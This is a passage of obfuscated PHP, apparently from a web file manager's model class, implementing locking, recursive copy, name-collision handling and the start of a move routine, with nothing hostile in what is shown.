CacheLock::setErrorMsg($DÌ°Û«¾Ä[358]); goto DƒÉŠÖåõ; BÈô‰İ”‡: if ($F‘¹öºõÀ’ > 0.5) { unset(self::$cacheSourceInfo[$DÌ°Û«¾Ä[406] . $BÁ»ÑÓ¶…]); } $a ÷«åè‰ = $this->sourceInfo($BÁ»ÑÓ¶…); if (!$a ÷«åè‰) { show_json(LNG($DÌ°Û«¾Ä[102]), !1); } goto E†¨Ö÷´±Í; DƒÉŠÖåõ: if (!isset($this->_lockTimeStart[$bŸÉ¸¿¥—„])) { return; } $F‘¹öºõÀ’ = timeFloat() - $this->_lockTimeStart[$bŸÉ¸¿¥—„]; unset($this->_lockTimeStart[$bŸÉ¸¿¥—„]); goto BÈô‰İ”‡; E†¨Ö÷´±Í: } private function _lockParent($EØŠğ¼ø¦×, $BÉ¡¿ß‹İå, $c çÖ†’Ü) { if (!$this->autoLockSet) { return; } $EÍ©¬éºˆ´ = $this->sourceInfo($EØŠğ¼ø¦×); if (!is_array($EÍ©¬éºˆ´)) { return; } $E­í¹áâäÚ = array_reverse($this->parentLevelArray($EÍ©¬éºˆ´[$_SERVER[Äº¡•ô™Ÿ][455]])); foreach ($E­í¹áâäÚ as $cÉ¾Å¡¢Ú) { $this->_lockEvent($cÉ¾Å¡¢Ú, $BÉ¡¿ß‹İå, $c çÖ†’Ü); } } private function _lockEvent($dº‰–§ôÍ, $Dì†Ç‹¼ÔÁ, $F˜µ×“·ß) { $bÅÂİ‰ˆ¯ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->autoLockSet) { return; } foreach ($Dì†Ç‹¼ÔÁ as $a¨ïêè¾£ñ) { $C´¨Â™¹…ä = $a¨ïêè¾£ñ . $bÅÂİ‰ˆ¯[93] . $dº‰–§ôÍ; if ($F˜µ×“·ß && CacheLock::lockGet($bÅÂİ‰ˆ¯[496] . $C´¨Â™¹…ä)) { continue; } $this->_lockKey($C´¨Â™¹…ä, $F˜µ×“·ß); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($F¥Ú©Ìƒ‚†, $a·ÓíÎÉÂ = 1) { $bÌ³é¬ÈÁå = $_SERVER[Äº¡•ô™Ÿ][496] . md5($F¥Ú©Ìƒ‚†); if ($a·ÓíÎÉÂ) { if (isset(self::$_lockItemArr[$bÌ³é¬ÈÁå])) { return; } self::$_lockItemArr[$bÌ³é¬ÈÁå] = 1; CacheLock::lock($bÌ³é¬ÈÁå, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$bÌ³é¬ÈÁå])) { return; } unset(self::$_lockItemArr[$bÌ³é¬ÈÁå]); CacheLock::unlock($bÌ³é¬ÈÁå); } } public function isParentOf($eÙÖ­ÃËÇ, $b”¡·¦ïƒ‚) { goto CŒìÜ¥óÄ«; E‰‡À‹œã™: return $b®ïÍ£šê; goto B–«Ò‚‘©¬; CŒìÜ¥óÄ«: $C¼ÁĞ¬Ã¾ =& $_SERVER[Äº¡•ô™Ÿ]; $cï»¢±Òº› = $this->sourceInfo($eÙÖ­ÃËÇ); $c»ğ©Äİ‡£ = $this->sourceInfo($b”¡·¦ïƒ‚); goto E‰¸œ‘Ã‰; E‰¸œ‘Ã‰: $C–¢Äˆ‚½ª = $cï»¢±Òº›[$C¼ÁĞ¬Ã¾[455]] . $cï»¢±Òº›[$C¼ÁĞ¬Ã¾[366]] . $C¼ÁĞ¬Ã¾[47]; $fÅÆ••Á¥ = $c»ğ©Äİ‡£[$C¼ÁĞ¬Ã¾[455]] . $c»ğ©Äİ‡£[$C¼ÁĞ¬Ã¾[366]] . $C¼ÁĞ¬Ã¾[47]; $b®ïÍ£šê = strpos($fÅÆ••Á¥, $C–¢Äˆ‚½ª) === 0; goto E‰‡À‹œã™; B–«Ò‚‘©¬: } private $targetIsDelete = 0; public function copy($b¥èÁÇí ‡, $E«ãİèô™Ó, $B¼‡İª½¤Ù = REPEAT_REPLACE, $bßµíˆ¾Ï = '') { goto fàÏ¸Ä­¥ä; CáœàöÇ»: $this->targetIsDelete = intval($aò‡Ğ”­‰ƒ[$d¶ªÉŠÜÆ³[393]]); $DŒ¨•ºŠ›¾ = $this->fileNameExistCache($E«ãİèô™Ó, $aò‡Ğ”­‰ƒ[$d¶ªÉŠÜÆ³[28]]); $F§Ñ¬Ö˜ = $this->_copy($b¥èÁÇí ‡, $E«ãİèô™Ó, $B¼‡İª½¤Ù, $d¹ª¡ĞÍÇ©, !0, $bßµíˆ¾Ï); goto E³¦ÌÓè…; Dâ¨æ”–½Ü: if ($aò‡Ğ”­‰ƒ[$d¶ªÉŠÜÆ³[367]] == $d¶ªÉŠÜÆ³[83] && $DŒ¨•ºŠ›¾ == $F§Ñ¬Ö˜) { $this->folderSizeResetChildren($DŒ¨•ºŠ›¾); } Model($d¶ªÉŠÜÆ³[500])->addAll($d¹ª¡ĞÍÇ©[$d¶ªÉŠÜÆ³[498]], array(), !0); if ($DŒ¨•ºŠ›¾ != $F§Ñ¬Ö˜ || $aò‡Ğ”­‰ƒ[$d¶ªÉŠÜÆ³[367]] == $d¶ªÉŠÜÆ³[83]) { Model($d¶ªÉŠÜÆ³[501])->eventCopy($F§Ñ¬Ö˜); } goto eìµÃ½‡ªÍ; fàÏ¸Ä­¥ä: $d¶ªÉŠÜÆ³ =& $_SERVER[Äº¡•ô™Ÿ]; $aò‡Ğ”­‰ƒ = $this->sourceInfo($b¥èÁÇí ‡); $eİäœó¾„‡ = $this->sourceInfo($E«ãİèô™Ó); goto Då¸¡¾‹í; aŠÈš‚–ºæ: $this->lockCopyStart($b¥èÁÇí ‡); $this->lockWriteStart($E«ãİèô™Ó, $A…’ˆ‘²®°); $d¹ª¡ĞÍÇ© = array($d¶ªÉŠÜÆ³[497] => array(), $d¶ªÉŠÜÆ³[498] => array(), $d¶ªÉŠÜÆ³[499] => array()); goto CáœàöÇ»; Då¸¡¾‹í: if (!$aò‡Ğ”­‰ƒ || !$eİäœó¾„‡ || $eİäœó¾„‡[$d¶ªÉŠÜÆ³[367]] != $d¶ªÉŠÜÆ³[83]) { return !1; } if ($this->isParentOf($b¥èÁÇí ‡, $E«ãİèô™Ó)) { return !1; } $A…’ˆ‘²®° = $bßµíˆ¾Ï ? $bßµíˆ¾Ï : $aò‡Ğ”­‰ƒ[$d¶ªÉŠÜÆ³[28]]; goto aŠÈš‚–ºæ; E³¦ÌÓè…: $this->_childrenListClear(); $this->lockCopyEnd($b¥èÁÇí ‡); $this->lockWriteEnd($E«ãİèô™Ó, $A…’ˆ‘²®°); goto Dâ¨æ”–½Ü; eìµÃ½‡ªÍ: $this->saveAll($d¹ª¡ĞÍÇ©[$d¶ªÉŠÜÆ³[499]]); Model($d¶ªÉŠÜÆ³[164])->linkAdd($d¹ª¡ĞÍÇ©[$d¶ªÉŠÜÆ³[497]]); $this->folderSizeReset($E«ãİèô™Ó); goto BÆé Î‹; BÆé Î‹: $this->updateModifyTime($E«ãİèô™Ó); return $F§Ñ¬Ö˜; goto AÆôÄ©Ş¿; AÆôÄ©Ş¿: } private function _copy($eòïö»³‘®, $CÈÚ„îª…, $b‰ø‰è‘‹à, &$F‰»•íÔ¢Æ, $fªŸ³µÎñã, $Eä¬ «´ö = '') { goto fÈŠí‡ª; Fêˆ¦±ª¿š: if (!$e…ñÕøñ°) { return $this->_copyCreate($eòïö»³‘®, $CÈÚ„îª…, $d—àÛÈÖÏ¡, $F‰»•íÔ¢Æ); } $càˆ„ƒÙÇö = $e…ñÕøñ°; if ($Dó‚–À) { if ($b‰ø‰è‘‹à == REPEAT_RENAME_FOLDER) { $d—àÛÈÖÏ¡ = $this->fileNameAutoCache($CÈÚ„îª…, $d—àÛÈÖÏ¡, $b‰ø‰è‘‹à, $Dó‚–À); $càˆ„ƒÙÇö = $this->_copyCreate($eòïö»³‘®, $CÈÚ„îª…, $d—àÛÈÖÏ¡, $F‰»•íÔ¢Æ); } else { $Aß¥Ê™Ùõ« = $this->_childrenList($eòïö»³‘®); foreach ($Aß¥Ê™Ùõ« as $Fõšš¥Øš) { $this->_copy($Fõšš¥Øš[$Fğœ«ˆ¾ƒÌ[366]], $e…ñÕøñ°, $b‰ø‰è‘‹à, $F‰»•íÔ¢Æ, !1); } } } else { if ($b‰ø‰è‘‹à == REPEAT_RENAME || $b‰ø‰è‘‹à == REPEAT_RENAME_FOLDER) { $d—àÛÈÖÏ¡ = $this->fileNameAutoCache($CÈÚ„îª…, $d—àÛÈÖÏ¡, $b‰ø‰è‘‹à, $Dó‚–À); $càˆ„ƒÙÇö = $this->_copyCreate($eòïö»³‘®, $CÈÚ„îª…, $d—àÛÈÖÏ¡, $F‰»•íÔ¢Æ); } else { if ($b‰ø‰è‘‹à == REPEAT_REPLACE) { $fğ§Ú£ŒÎ = $this->sourceInfoCache($e…ñÕøñ°); $cßà£ãî§Ä = $this->fileHistory($fğ§Ú£ŒÎ, $C¸àÇ×í×õ[$Fğœ«ˆ¾ƒÌ[415]], $C¸àÇ×í×õ[$Fğœ«ˆ¾ƒÌ[77]]); if ($cßà£ãî§Ä) { $F‰»•íÔ¢Æ[$Fğœ«ˆ¾ƒÌ[497]][] = $C¸àÇ×í×õ[$Fğœ«ˆ¾ƒÌ[415]]; } } else { if ($b‰ø‰è‘‹à == REPEAT_SKIP) { } } } Hook::trigger($Fğœ«ˆ¾ƒÌ[502], array($Fğœ«ˆ¾ƒÌ[503], $C¸àÇ×í×õ, 0)); } goto dÄî¢ì÷; dÄî¢ì÷: return $càˆ„ƒÙÇö; goto CÇîŞÍã«‰; AŠÜÌ‘ƒÌ: $d—àÛÈÖÏ¡ = $Eä¬ «´ö ? $Eä¬ «´ö : $C¸àÇ×í×õ[$Fğœ«ˆ¾ƒÌ[28]]; $e…ñÕøñ° = $this->fileNameExistCache($CÈÚ„îª…, $d—àÛÈÖÏ¡); if ($fªŸ³µÎñã) { $this->_childrenAllMake($eòïö»³‘®); if ($Dó‚–À && $e…ñÕøñ°) { $this->_childrenAllMake($e…ñÕøñ°); } } goto Fêˆ¦±ª¿š; fÈŠí‡ª: $Fğœ«ˆ¾ƒÌ =& $_SERVER[Äº¡•ô™Ÿ]; $C¸àÇ×í×õ = $this->sourceInfoCache($eòïö»³‘®); $Dó‚–À = $C¸àÇ×í×õ[$Fğœ«ˆ¾ƒÌ[367]] == $Fğœ«ˆ¾ƒÌ[83]; goto AŠÜÌ‘ƒÌ; CÇîŞÍã«‰: } private function _copyCreate($dˆó§õÆ ¿, $CÓôÆÕê¹, $dòÌ‡òİ´¢, &$D§¤øÕêë) { goto E°éñ¿‘‹·; AŸ­³»È˜: $fê½Ÿ•ˆŒµ = $this->add($cªĞ—¯õĞŞ); $eŠŒƒ¿î = array($c½·Ù‹Š†Ó[366] => $fê½Ÿ•ˆŒµ, $c½·Ù‹Š†Ó[28] => $dòÌ‡òİ´¢); $this->_copyApplyMeta($eŠŒƒ¿î, $D§¤øÕêë); goto fà©ÄŸƒ™; fà©ÄŸƒ™: if ($e×Û¶ĞˆÑ‚[$c½·Ù‹Š†Ó[367]] != $c½·Ù‹Š†Ó[83]) { $D§¤øÕêë[$c½·Ù‹Š†Ó[497]][] = $e×Û¶ĞˆÑ‚[$c½·Ù‹Š†Ó[415]]; return $fê½Ÿ•ˆŒµ; } $d´ÈÆêÕ¿Ú = array(); $aºµçÜ‚¡¦ = array(); goto f˜èäğë‚‘; c»·äß×ˆŒ: $this->addAll($aºµçÜ‚¡¦, array(), !1); $fËî‘Ë³ = $this->where(array($c½·Ù‹Š†Ó[457] => $fê½Ÿ•ˆŒµ))->select(); $aÀ‹˜²°çê = $this->_childrenMakeRelation($d´ÈÆêÕ¿Ú, $fËî‘Ë³); goto A¤—‚´µ„; A¤—‚´µ„: $aÀ‹˜²°çê[$dˆó§õÆ ¿] = $fê½Ÿ•ˆŒµ; $døø¸Ì­Í = array(); $cŸÏÅ‡ñ˜Ù = array(); goto b’Üöô×Œ; cìõÉ³¹…İ: $this->chunkEventSet($c½·Ù‹Š†Ó[511], array($c½·Ù‹Š†Ó[512], $cªĞ—¯õĞŞ, $cÎÅìé–Œ)); $this->saveAll($cŸÏÅ‡ñ˜Ù); return $fê½Ÿ•ˆŒµ; goto fÓÇîø†×¸; E°éñ¿‘‹·: $c½·Ù‹Š†Ó =& $_SERVER[Äº¡•ô™Ÿ]; $e×Û¶ĞˆÑ‚ = $this->sourceInfoCache($dˆó§õÆ ¿); $cÍÍ ã¹Æ§ = $this->sourceInfoCache($CÓôÆÕê¹); goto dâÔÜùÌé«; dâÔÜùÌé«: $cªĞ—¯õĞŞ = $this->_makeItemData($e×Û¶ĞˆÑ‚, $cÍÍ ã¹Æ§, $dòÌ‡òİ´¢); Hook::trigger($c½·Ù‹Š†Ó[504], $cªĞ—¯õĞŞ); Hook::trigger($c½·Ù‹Š†Ó[505], array($c½·Ù‹Š†Ó[506], $cªĞ—¯õĞŞ, 0)); goto AŸ­³»È˜; b’Üöô×Œ: foreach ($fËî‘Ë³ as $dª´…ìÀ„) { $EËğÓ—ã·œ = $dª´…ìÀ„[$c½·Ù‹Š†Ó[366]]; $cÃÀÄ´¢Ä± = $this->_childrenMatch($aÀ‹˜²°çê, $dª´…ìÀ„, $Bî°Îåºà ); $døø¸Ì­Í[] = array($c½·Ù‹Š†Ó[366], $EËğÓ—ã·œ, $c½·Ù‹Š†Ó[457], $cÃÀÄ´¢Ä±[$c½·Ù‹Š†Ó[457]]); $cŸÏÅ‡ñ˜Ù[] = array($c½·Ù‹Š†Ó[366], $EËğÓ—ã·œ, $c½·Ù‹Š†Ó[455], $cÃÀÄ´¢Ä±[$c½·Ù‹Š†Ó[455]]); $this->_copyApplyMeta($dª´…ìÀ„, $D§¤øÕêë); if ($dª´…ìÀ„[$c½·Ù‹Š†Ó[367]] != $c½·Ù‹Š†Ó[83]) { $D§¤øÕêë[$c½·Ù‹Š†Ó[497]][] = $dª´…ìÀ„[$c½·Ù‹Š†Ó[415]]; } } $this->chunkEventSet($c½·Ù‹Š†Ó[509], array($c½·Ù‹Š†Ó[510], $cªĞ—¯õĞŞ, $cÎÅìé–Œ)); $this->saveAll($døø¸Ì­Í); goto cìõÉ³¹…İ; e°ÁÀÜÃÜ: $Bî°Îåºà  = $this->sourceInfo($fê½Ÿ•ˆŒµ); foreach ($d´ÈÆêÕ¿Ú as $dª´…ìÀ„) { $d”›½Ìº± = $this->_makeItemData($dª´…ìÀ„, $Bî°Îåºà , $dª´…ìÀ„[$c½·Ù‹Š†Ó[28]]); $d”›½Ìº±[$c½·Ù‹Š†Ó[455]] = $dª´…ìÀ„[$c½·Ù‹Š†Ó[455]]; $aºµçÜ‚¡¦[] = $d”›½Ìº±; } $this->chunkEventSet($c½·Ù‹Š†Ó[507], array($c½·Ù‹Š†Ó[508], $cªĞ—¯õĞŞ, $cÎÅìé–Œ)); goto c»·äß×ˆŒ; f˜èäğë‚‘: $this->_childrenListAll($dˆó§õÆ ¿, $d´ÈÆêÕ¿Ú); $cÎÅìé–Œ = count($d´ÈÆêÕ¿Ú); if ($cÎÅìé–Œ == 0) { return $fê½Ÿ•ˆŒµ; } goto e°ÁÀÜÃÜ; fÓÇîø†×¸: } private function _childrenMakeRelation($A„åîø±Ë, $dˆÇšİ¤ñ) { $F©ï·òô½ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $B©²ì‚­ª = array(); $DšµäˆŒ¤ = array(); foreach ($A„åîø±Ë as $eÓï³“÷´Û) { $F¿…—Ç–ù× = $eÓï³“÷´Û[$F©ï·òô½ƒ[28]] . $F©ï·òô½ƒ[8] . $eÓï³“÷´Û[$F©ï·òô½ƒ[455]]; $B©²ì‚­ª[$F¿…—Ç–ù×] = $eÓï³“÷´Û[$F©ï·òô½ƒ[366]]; } foreach ($dˆÇšİ¤ñ as $eÓï³“÷´Û) { $F¿…—Ç–ù× = $eÓï³“÷´Û[$F©ï·òô½ƒ[28]] . $F©ï·òô½ƒ[8] . $eÓï³“÷´Û[$F©ï·òô½ƒ[455]]; $Bà·°÷Ã ‡ = $B©²ì‚­ª[$F¿…—Ç–ù×]; $DšµäˆŒ¤[$Bà·°÷Ã ‡] = $eÓï³“÷´Û[$F©ï·òô½ƒ[366]]; } return $DšµäˆŒ¤; } private function _childrenMatch($aƒèéø‘ˆç, $cÅé¬£ÂÂÓ, $e¿““’¿½ó) { goto d¹‡Ä®« ½; d¹‡Ä®« ½: $Eå’Øõ’‘‘ =& $_SERVER[Äº¡•ô™Ÿ]; $e¿ïÙ˜‘Õ = $e¿““’¿½ó[$Eå’Øõ’‘‘[455]]; $a—ï¸›Ì†— = $this->parentLevelArray($cÅé¬£ÂÂÓ[$Eå’Øõ’‘‘[455]]); goto BŞ”È¼Á»†; f°»½„ß±í: $F¡ŠË¹½î± = $B¾Ø³†Ç¨È[count($B¾Ø³†Ç¨È) - 1]; return array($Eå’Øõ’‘‘[457] => $F¡ŠË¹½î±, $Eå’Øõ’‘‘[455] => $e¿ïÙ˜‘Õ); goto e÷”¢Çè°Â; BŞ”È¼Á»†: foreach ($a—ï¸›Ì†— as $d‚¬È„ê…Ï) { if (isset($aƒèéø‘ˆç[$d‚¬È„ê…Ï])) { $e¿ïÙ˜‘Õ .= $aƒèéø‘ˆç[$d‚¬È„ê…Ï] . $Eå’Øõ’‘‘[513]; } } $e¿ïÙ˜‘Õ = rtrim($e¿ïÙ˜‘Õ, $Eå’Øõ’‘‘[47]) . $Eå’Øõ’‘‘[47]; $B¾Ø³†Ç¨È = $this->parentLevelArray($e¿ïÙ˜‘Õ); goto f°»½„ß±í; e÷”¢Çè°Â: } private function _makeItemData($FøÌË÷å¡„, $d¸¹Í»÷§, $C±šâ´óŞí) { $dùÜÜ·¡£ä =& $_SERVER[Äº¡•ô™Ÿ]; $dõÊéÊ¿ã = array($dùÜÜ·¡£ä[514] => $FøÌË÷å¡„[$dùÜÜ·¡£ä[367]], $dùÜÜ·¡£ä[383] => $C±šâ´óŞí, $dùÜÜ·¡£ä[515] => $FøÌË÷å¡„[$dùÜÜ·¡£ä[369]], $dùÜÜ·¡£ä[416] => $FøÌË÷å¡„[$dùÜÜ·¡£ä[415]], $dùÜÜ·¡£ä[516] => $FøÌË÷å¡„[$dùÜÜ·¡£ä[77]], $dùÜÜ·¡£ä[517] => $d¸¹Í»÷§[$dùÜÜ·¡£ä[368]], $dùÜÜ·¡£ä[518] => $d¸¹Í»÷§[$dùÜÜ·¡£ä[452]], $dùÜÜ·¡£ä[519] => USER_ID, $dùÜÜ·¡£ä[520] => USER_ID, $dùÜÜ·¡£ä[365] => $d¸¹Í»÷§[$dùÜÜ·¡£ä[366]], $dùÜÜ·¡£ä[521] => $d¸¹Í»÷§[$dùÜÜ·¡£ä[455]] . $d¸¹Í»÷§[$dùÜÜ·¡£ä[366]] . $dùÜÜ·¡£ä[47], $dùÜÜ·¡£ä[392] => 0, $dùÜÜ·¡£ä[522] => $dùÜÜ·¡£ä[33]); return $dõÊéÊ¿ã; } private function _copyApplyMeta($a¹øõÆÀ’Ò, &$aÂ­Î˜‘Ò) { $DˆØìì”ï÷ =& $_SERVER[Äº¡•ô™Ÿ]; $c¼²êæÀ‘ = $a¹øõÆÀ’Ò[$DˆØìì”ï÷[366]]; $D•²öÂ›“ = $a¹øõÆÀ’Ò[$DˆØìì”ï÷[28]]; if (!isset($a¹øõÆÀ’Ò[$DˆØìì”ï÷[523]]) || !$a¹øõÆÀ’Ò[$DˆØìì”ï÷[523]] || $a¹øõÆÀ’Ò[$DˆØìì”ï÷[523]] == $DˆØìì”ï÷[464]) { $aÂ­Î˜‘Ò[$DˆØìì”ï÷[499]][] = array($DˆØìì”ï÷[366], $c¼²êæÀ‘, $DˆØìì”ï÷[523], short_id($c¼²êæÀ‘)); } if (Input::check($D•²öÂ›“, $DˆØìì”ï÷[524])) { $aÂ­Î˜‘Ò[$DˆØìì”ï÷[498]][] = array($DˆØìì”ï÷[366] => $c¼²êæÀ‘, $DˆØìì”ï÷[89] => $DˆØìì”ï÷[412], $DˆØìì”ï÷[356] => str_replace($DˆØìì”ï÷[50], $DˆØìì”ï÷[33], Pinyin::encode($D•²öÂ›“))); $aÂ­Î˜‘Ò[$DˆØìì”ï÷[498]][] = array($DˆØìì”ï÷[366] => $c¼²êæÀ‘, $DˆØìì”ï÷[89] => $DˆØìì”ï÷[411], $DˆØìì”ï÷[356] => Pinyin::encode($D•²öÂ›“, $DˆØìì”ï÷[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($d’‹’×‰š°) { goto B’¶›Ì­£; B’¶›Ì­£: $eöˆÖåé =& $_SERVER[Äº¡•ô™Ÿ]; $e¿…ƒÖë¹ = $this->sourceInfo($d’‹’×‰š°); $fĞŠö“ìÛš = $eöˆÖåé[526]; goto aŒ•ÎÚ´äé; aŒ•ÎÚ´äé: $D©›–ò¢ø  = array($eöˆÖåé[455] => array($eöˆÖåé[479], $e¿…ƒÖë¹[$eöˆÖåé[455]] . $d’‹’×‰š° . $eöˆÖåé[480]), $eöˆÖåé[393] => $this->targetIsDelete); $DÒŠ¹”ößÌ = $this->field($fĞŠö“ìÛš)->where($D©›–ò¢ø )->select(); if (!$DÒŠ¹”ößÌ) { return; } goto F–Ê§§ÇßÈ; F–Ê§§ÇßÈ: $DÒŠ¹”ößÌ = array_to_keyvalue($DÒŠ¹”ößÌ, $eöˆÖåé[366]); foreach ($DÒŠ¹”ößÌ as $Cô¤¥¯ÒË) { $BŞâ…ÇÈ’² = $Cô¤¥¯ÒË[$eöˆÖåé[457]]; $d’‹’×‰š° = $Cô¤¥¯ÒË[$eöˆÖåé[366]]; if (!isset($this->_childrenListCache[$d’‹’×‰š°]) && $Cô¤¥¯ÒË[$eöˆÖåé[367]] == $eöˆÖåé[83]) { $this->_childrenListCache[$d’‹’×‰š°] = array(); } if (!isset($this->_childrenListCache[$BŞâ…ÇÈ’²])) { $this->_childrenListCache[$BŞâ…ÇÈ’²] = array(); } $this->_childrenListCache[$BŞâ…ÇÈ’²][$d’‹’×‰š°] = $Cô¤¥¯ÒË; $this->_childrenItemCache[$d’‹’×‰š°] = $Cô¤¥¯ÒË; } goto f×°ŸÜ¨»; f×°ŸÜ¨»: } private function _childrenListAll($A”ß†ÖÜ°¢, &$dÈ¡ÏæâÖ³) { $a³ÏÖÚ³Š =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($this->_childrenListCache[$A”ß†ÖÜ°¢])) { return; } $CÜëšÄ©óÒ = $this->_childrenListCache[$A”ß†ÖÜ°¢]; foreach ($CÜëšÄ©óÒ as $B×‹Êá…µâ => $cù·öñ°ñ) { $dÈ¡ÏæâÖ³[$B×‹Êá…µâ] = $cù·öñ°ñ; if ($cù·öñ°ñ[$a³ÏÖÚ³Š[367]] == $a³ÏÖÚ³Š[83]) { $this->_childrenListAll($B×‹Êá…µâ, $dÈ¡ÏæâÖ³); } } } private function sourceInfoCache($a‚ÉÀ·’¥Û) { if (isset($this->_childrenItemCache[$a‚ÉÀ·’¥Û])) { return $this->_childrenItemCache[$a‚ÉÀ·’¥Û]; } return $this->sourceInfo($a‚ÉÀ·’¥Û); } private function _childrenList($fÜÍ™õÌÕÚ) { if (isset($this->_childrenListCache[$fÜÍ™õÌÕÚ])) { return $this->_childrenListCache[$fÜÍ™õÌÕÚ]; } return $this->_childrenListSelect($fÜÍ™õÌÕÚ); } private function _childrenListSelect($B¡ÎÄĞˆôï) { goto d²Û²¢‰‰´; D¶¢·‚ÁÖÓ: foreach ($DáÉŞÌ«İ as $B¡ÎÄĞˆôï => $Bğ«èÉâ­¤) { $this->_childrenItemCache[$B¡ÎÄĞˆôï] = $Bğ«èÉâ­¤; } return $DáÉŞÌ«İ; goto C‹¬¼¯†µ–; d²Û²¢‰‰´: $AäŒÊØİµ˜ =& $_SERVER[Äº¡•ô™Ÿ]; $e¤……¸ö÷… = array($AäŒÊØİµ˜[457] => $B¡ÎÄĞˆôï, $AäŒÊØİµ˜[393] => $this->targetIsDelete); $dÆÏ—š²•¸ = $this->where($e¤……¸ö÷…)->select(); goto dĞ‚¸øì‚¦; dĞ‚¸øì‚¦: $dÆÏ—š²•¸ = $dÆÏ—š²•¸ ? $dÆÏ—š²•¸ : array(); $DáÉŞÌ«İ = array_to_keyvalue($dÆÏ—š²•¸, $AäŒÊØİµ˜[366]); $this->_childrenListCache[$B¡ÎÄĞˆôï] = $DáÉŞÌ«İ; goto D¶¢·‚ÁÖÓ; C‹¬¼¯†µ–: } private function fileNameExistCache($Cìéğœ¡ğÔ, $C»°ÑÌ»ĞÏ) { $a¸ÅÔƒƒ” =& $_SERVER[Äº¡•ô™Ÿ]; $C»°ÑÌ»ĞÏ = strtolower($C»°ÑÌ»ĞÏ); $Eß¢ˆ¢ºÔ¹ = $this->_childrenList($Cìéğœ¡ğÔ); foreach ($Eß¢ˆ¢ºÔ¹ as $d»Ü›‘”ƒë) { if ($C»°ÑÌ»ĞÏ == strtolower($d»Ü›‘”ƒë[$a¸ÅÔƒƒ”[28]])) { return $d»Ü›‘”ƒë[$a¸ÅÔƒƒ”[366]]; } } return !1; } private function fileNameAutoCache($cÜî¥…ˆÖ§, $A˜‘ÊÃééË, $Fâ›Ë ó‡¤, $F‡·©èŒ°‹) { $BÊ°‹âÌ½¦ =& $_SERVER[Äº¡•ô™Ÿ]; $Bñ‚£Ïä‡  = $this->_childrenList($cÜî¥…ˆÖ§); $D¦«­ëÂ = array_to_keyvalue($Bñ‚£Ïä‡ , $BÊ°‹âÌ½¦[33], $BÊ°‹âÌ½¦[28]); return $this->fileNameAutoGet($D¦«­ëÂ, $A˜‘ÊÃééË, $Fâ›Ë ó‡¤, $F‡·©èŒ°‹); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($b¨§ó±·Œ, $A¤“ º‰çÌ, $C¾µ±£®ÅÈ = REPEAT_REPLACE, $Dáöâù“°³ = '') { goto E†›”„¢†‹; f§í¦¦­Ûî: $fÂ§Œ˜Ü—† = $Dáöâù“°³ ? $Dáöâù“°³ : $BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[28]]; $this->lockMoveStart($b¨§ó±·Œ); $this->lockWriteStart($A¤“ º‰çÌ, $fÂ§Œ˜Ü—†); goto CŞñ¤ìöÓ¢; AÖô†ãÇñ´: $C°ŸŒ–º°Ÿ = $this->pathInfoMore($b¨§ó±·Œ); if ($this->isParentOf($b¨§ó±·Œ, $A¤“ º‰çÌ)) { return !1; } if (!$BÇ‰ªÍÌ¶œ || !$cö¾¹ğ¤¨µ || $cö¾¹ğ¤¨µ[$c¨õßßñÚ“[367]] != $c¨õßßñÚ“[83]) { return !1; } goto Aà”¶Ş‘ˆ; E†›”„¢†‹: $c¨õßßñÚ“ =& $_SERVER[Äº¡•ô™Ÿ]; $BÇ‰ªÍÌ¶œ = $this->sourceInfo($b¨§ó±·Œ); $cö¾¹ğ¤¨µ = $this->sourceInfo($A¤“ º‰çÌ); goto AÖô†ãÇñ´; Aà”¶Ş‘ˆ: Hook::trigger($c¨õßßñÚ“[527], $C°ŸŒ–º°Ÿ); $this->targetIsDelete = intval($BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[393]]); if ($BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[457]] == $A¤“ º‰çÌ && $Dáöâù“°³ != $BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[28]]) { $DÁ™¥ÜöÛ³ = $this->fileNameExist($A¤“ º‰çÌ, $Dáöâù“°³); if ($DÁ™¥ÜöÛ³ && $BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[367]] == $c¨õßßñÚ“[464]) { goto EˆÚì±…ù¹; B£ï’Ùß­Ñ: $this->removeNow($b¨§ó±·Œ, !1); $this->folderSizeReset($A¤“ º‰çÌ); Hook::trigger($c¨õßßñÚ“[528], $C°ŸŒ–º°Ÿ); goto A†…±ƒ™; A†…±ƒ™: return $DÁ™¥ÜöÛ³; goto f¼ˆ„ÏŒÔ©; EˆÚì±…ù¹: $bÓº»ÙäÒ = $this->sourceInfo($DÁ™¥ÜöÛ³); $c¨ï•ç = $this->fileHistory($bÓº»ÙäÒ, $BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[415]], $BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[77]]); if (!$c¨ï•ç) { Model($c¨õßßñÚ“[418])->remove($BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[415]]); } goto B£ï’Ùß­Ñ; f¼ˆ„ÏŒÔ©: } } goto f§í¦¦­Ûî; CÜÙ¥¿Äï›: $F†Å‡ÃÁùò = $this->_move($b¨§ó±·Œ, $A¤“ º‰çÌ, $C¾µ±£®ÅÈ, $Cãñ†¶æö¬, $Dáöâù“°³); $this->sourceCacheClear(); if ($BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[367]] == $c¨õßßñÚ“[83] && $dêƒÄ¯öé) { $this->folderSizeResetChildren($F†Å‡ÃÁùò); } goto eš÷Î•ÈîÛ; eš÷Î•ÈîÛ: Model($c¨õßßñÚ“[164])->linkAdd($Cãñ†¶æö¬[$c¨õßßñÚ“[497]]); if ($dêƒÄ¯öé && $Cãñ†¶æö¬[$c¨õßßñÚ“[529]]) { $this->removeNow($b¨§ó±·Œ, !1); } $this->lockMoveEnd($b¨§ó±·Œ); goto Eå¡£Â£œ´; CŞñ¤ìöÓ¢: $Cãñ†¶æö¬ = array($c¨õßßñÚ“[497] => array(), $c¨õßßñÚ“[529] => !1); $this->clearShare($b¨§ó±·Œ, $A¤“ º‰çÌ); $dêƒÄ¯öé = $this->fileNameExistCache($A¤“ º‰çÌ, 